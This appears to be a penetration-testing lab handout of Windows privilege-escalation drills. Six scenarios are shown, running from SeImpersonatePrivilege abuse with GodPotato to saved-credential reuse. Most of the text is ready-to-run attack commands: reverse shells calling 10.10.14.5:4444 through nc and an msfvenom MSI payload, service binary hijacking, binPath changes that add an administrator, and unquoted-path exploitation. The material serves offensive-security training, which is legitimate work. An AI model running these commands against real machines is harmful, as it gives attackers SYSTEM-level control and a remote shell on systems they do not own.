# Lab 07 (Part 2): 10 Hands-On Windows Privilege Escalation Drills

Step-by-step practical drills for escalating privileges on Windows systems from low-privilege service accounts to `NT AUTHORITY\SYSTEM`.

---

## 🥊 Scenario 1: Token Impersonation (`SeImpersonatePrivilege` & GodPotato)
- **Vulnerability**: You gain an initial shell as IIS or MSSQL service account (`iis apppool\defaultapppool` or `nt service\mssql$sqlexpress`):
  ```cmd
  whoami /priv
  # Privilege Name                Description                               State
  # ============================= ========================================= ========
  # SeImpersonatePrivilege        Impersonate a client after authentication Enabled
  ```
- **Exploitation**:
  Transfer `GodPotato-NET4.exe` to target:
  ```cmd
  # Add your low-privilege user to local Administrators group
  GodPotato-NET4.exe -cmd "net localgroup Administrators lowpriv_user /add"
  
  # Or spawn reverse shell directly as SYSTEM
  GodPotato-NET4.exe -cmd "cmd.exe /c C:\nc.exe 10.10.14.5 4444 -e cmd.exe"
  ```
- **Result**: Immediate `NT AUTHORITY\SYSTEM` code execution.

---

## 🥊 Scenario 2: Unquoted Service Paths
- **Vulnerability**: A service binary path has spaces and is not enclosed in double quotes:
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
  # Output: C:\Program Files\Development Tools\Task Runner\service.exe
  ```
- **Windows Resolution Order**:
  Windows checks paths in this order:
  1. `C:\Program.exe`
  2. `C:\Program Files\Development.exe`
  3. `C:\Program Files\Development Tools\Task.exe`
  4. `C:\Program Files\Development Tools\Task Runner\service.exe`
- **Exploitation**:
  If you have write permissions to `C:\Program Files\Development Tools\`:
  ```cmd
  # Drop payload as Task.exe
  copy C:\Temp\malicious_shell.exe "C:\Program Files\Development Tools\Task.exe"
  # Restart computer or restart service
  sc stop "TaskRunnerService"
  sc start "TaskRunnerService"
  ```

---

## 🥊 Scenario 3: Weak Service Binary Permissions
- **Vulnerability**: Inspect service permissions using `accesschk.exe`:
  ```cmd
  accesschk.exe /accepteula -quv "C:\Services\updater.exe"
  # Output: RW Everyone (File is writable by all users!)
  ```
- **Exploitation**:
  Replace `updater.exe` with your reverse shell executable:
  ```cmd
  copy updater.exe updater.exe.bak
  copy C:\Temp\shell.exe C:\Services\updater.exe
  sc stop UpdaterService
  sc start UpdaterService
  ```

---

## 🥊 Scenario 4: Weak Service Configuration (`SERVICE_CHANGE_CONFIG`)
- **Vulnerability**: The service itself allows reconfiguration:
  ```cmd
  accesschk.exe /accepteula -ucwv "Users" *
  # ServiceName: CustomService
  #   SERVICE_CHANGE_CONFIG
  #   SERVICE_START
  #   SERVICE_STOP
  ```
- **Exploitation**:
  Change the binary path (`binPath`) directly using `sc config`:
  ```cmd
  sc config CustomService binPath= "cmd.exe /k net localgroup administrators lowpriv /add"
  sc stop CustomService
  sc start CustomService
  ```

---

## 🥊 Scenario 5: AlwaysInstallElevated (MSI Escalation)
- **Vulnerability**: Check registry keys:
  ```cmd
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
  If **both** return `0x1`, any `.msi` file will install with elevated `SYSTEM` privileges!
- **Exploitation**:
  Generate an MSI reverse shell with `msfvenom`:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o installer.msi
  ```
  Run on target without GUI:
  ```cmd
  msiexec /quiet /qn /i installer.msi
  ```

---

## 🥊 Scenario 6: Saved Credentials in Windows Credential Manager
- **Vulnerability**: Stored credentials for other users or domains:
  ```cmd
  cmdkey /list
  # Target: Domain:target=CORP-DC
  # Type: Domain Password
  # User: administrator
  ```
- **Exploitation**:
  Run commands as the stored user using `runas /savecred`:
  ```cmd
  runas /savecred /user:administrator "cmd.exe /k whoami"
  ```
